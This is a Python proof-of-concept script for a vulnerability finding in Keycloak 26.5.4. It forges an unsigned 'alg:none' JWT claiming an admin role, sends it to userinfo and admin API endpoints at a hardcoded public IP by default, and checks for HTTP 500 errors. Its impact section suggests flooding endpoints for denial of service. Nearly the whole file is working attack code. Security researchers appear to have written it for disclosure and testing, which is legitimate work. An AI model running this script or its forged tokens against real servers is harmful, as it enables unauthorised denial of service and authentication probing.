#!/usr/bin/env python3
"""
Finding #2: Unhandled NullPointerException on alg:none JWT
Severity: MEDIUM (CVSS 5.3)
Target: Keycloak 26.5.4

Sends a JWT with "alg":"none" to Bearer-authenticated endpoints.
Keycloak throws NullPointerException and returns HTTP 500 instead of 401.
"""

import base64
import json
import http.client
import argparse
import sys

# ANSI colors
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

def banner():
    print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
║  Finding #2: alg:none JWT → HTTP 500 (NullPointerException)  ║
║  Severity: MEDIUM (CVSS 5.3)                                 ║
║  Keycloak 26.5.4 — Improper Input Validation                ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")

def step(num, msg):
    print(f"{CYAN}[*] Step {num}:{RESET} {msg}")

def success(msg):
    print(f"{GREEN}[+]{RESET} {msg}")

def fail(msg):
    print(f"{RED}[!]{RESET} {msg}")

def info(msg):
    print(f"{YELLOW}[*]{RESET} {msg}")

def b64url_encode(data):
    return base64.urlsafe_b64encode(
        json.dumps(data, separators=(",", ":")).encode()
    ).rstrip(b"=").decode()

def craft_alg_none_jwt():
    header = {"alg": "none", "typ": "JWT"}
    payload = {"sub": "attacker", "exp": 9999999999, "iat": 1000000000,
               "preferred_username": "attacker", "realm_access": {"roles": ["admin"]}}
    return f"{b64url_encode(header)}.{b64url_encode(payload)}."

def send_request(host, port, method, path, token):
    conn = http.client.HTTPConnection(host, port, timeout=10)
    headers = {"Authorization": f"Bearer {token}", "Accept": "application/json"}
    conn.request(method, path, headers=headers)
    resp = conn.getresponse()
    body = resp.read().decode()
    conn.close()
    return resp.status, body

def main():
    parser = argparse.ArgumentParser(description="Finding #2: alg:none JWT NPE PoC")
    parser.add_argument("--host", default="http://46.101.162.187:8080",
                        help="Keycloak base URL (default: http://46.101.162.187:8080)")
    args = parser.parse_args()

    url = args.host.rstrip("/")
    if "://" in url:
        url = url.split("://", 1)[1]
    if ":" in url:
        host, port = url.rsplit(":", 1)
        port = int(port)
    else:
        host, port = url, 8080

    banner()
    info(f"Target: {host}:{port}")
    realm = "test"
    results = []

    # ── Step 1: Craft alg:none JWT ──
    step(1, "Crafting alg:none JWT token...")
    token = craft_alg_none_jwt()
    parts = token.split(".")
    header_decoded = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
    print(f"    Header:  {json.dumps(header_decoded)}")
    print(f"    Payload: sub=attacker, roles=[admin]")
    print(f"    Sig:     (empty — alg:none)")
    print(f"    Token:   {token[:70]}...")
    print()

    # ── Step 2: Send to /userinfo ──
    step(2, "Sending alg:none JWT to /userinfo endpoint...")
    info("Expected: HTTP 401 Unauthorized")
    status, body = send_request(host, port, "GET",
                                f"/realms/{realm}/protocol/openid-connect/userinfo", token)
    print(f"    HTTP Status: {status}")
    print(f"    Response:    {body[:200]}")
    if status == 500:
        fail("VULNERABLE — HTTP 500 returned instead of 401!")
        fail("Server threw NullPointerException in JWT validation pipeline")
        results.append(("/userinfo", True))
    elif status == 401:
        success("Properly returned 401 — not vulnerable")
        results.append(("/userinfo", False))
    else:
        info(f"Unexpected status: {status}")
        results.append(("/userinfo", False))
    print()

    # ── Step 3: Send to /admin/realms/test/users ──
    step(3, "Sending alg:none JWT to admin /users endpoint...")
    status, body = send_request(host, port, "GET",
                                f"/admin/realms/{realm}/users", token)
    print(f"    HTTP Status: {status}")
    print(f"    Response:    {body[:200]}")
    if status == 500:
        fail("VULNERABLE — admin API also returns 500!")
        results.append(("/admin/users", True))
    elif status == 401:
        success("Properly returned 401")
        results.append(("/admin/users", False))
    else:
        results.append(("/admin/users", False))
    print()

    # ── Step 4: Send to /admin/realms/test/clients ──
    step(4, "Sending alg:none JWT to admin /clients endpoint...")
    status, body = send_request(host, port, "GET",
                                f"/admin/realms/{realm}/clients", token)
    print(f"    HTTP Status: {status}")
    print(f"    Response:    {body[:200]}")
    if status == 500:
        fail("VULNERABLE — /clients also returns 500!")
        results.append(("/admin/clients", True))
    else:
        results.append(("/admin/clients", status == 500))
    print()

    # ── Step 5: Control test — random string (should get 401) ──
    step(5, "Control test: sending random string as Bearer token...")
    info("Expected: HTTP 401 (proves 500 is specific to alg:none)")
    status, body = send_request(host, port, "GET",
                                f"/realms/{realm}/protocol/openid-connect/userinfo",
                                "this-is-not-a-jwt")
    print(f"    HTTP Status: {status}")
    if status == 401:
        success("Control test passed — random string returns 401 correctly")
    else:
        fail(f"Unexpected: random string returned {status}")
    print()

    # ── Step 6: Control test — valid structure, wrong sig (should get 401) ──
    step(6, "Control test: valid JWT structure with wrong signature...")
    bad_jwt = "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ0ZXN0In0.invalid"
    status, body = send_request(host, port, "GET",
                                f"/realms/{realm}/protocol/openid-connect/userinfo", bad_jwt)
    print(f"    HTTP Status: {status}")
    if status == 401:
        success("Control test passed — wrong-sig JWT returns 401 correctly")
    else:
        fail(f"Unexpected: wrong-sig JWT returned {status}")
    print()

    # ── Summary ──
    vuln_count = sum(1 for _, v in results if v)
    print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
║  RESULTS SUMMARY                                             ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")
    for name, vuln in results:
        status_str = f"{RED}VULNERABLE (HTTP 500){RESET}" if vuln else f"{GREEN}NOT VULNERABLE (HTTP 401){RESET}"
        print(f"  {name:30s} {status_str}")

    print(f"""
{YELLOW}Server Log (expected):{RESET}
  ERROR [org.keycloak.services.error.KeycloakErrorHandler]
  Uncaught server error: java.lang.NullPointerException:
  Cannot invoke "org.keycloak.crypto.SignatureProvider.verifier(String)"
  because the return value of
  "org.keycloak.models.KeycloakSession.getProvider(Class, String)" is null

{YELLOW}Impact:{RESET}
  - Unauthenticated DoS: flood any endpoint with alg:none tokens → 500 errors
  - All Bearer-authenticated endpoints affected (shared JWT validation pipeline)
  - HTTP 500 pollutes error logs and triggers false monitoring alerts

{YELLOW}Root Cause:{RESET}
  No null check on SignatureProvider after getProvider("none") returns null.
  Algorithm "none" is not explicitly rejected before provider lookup.
""")

    if vuln_count > 0:
        print(f"{RED}{BOLD}[!] {vuln_count}/{len(results)} endpoints vulnerable{RESET}")
        return 0
    else:
        print(f"{GREEN}[+] All endpoints handled correctly{RESET}")
        return 1

if __name__ == "__main__":
    sys.exit(main())
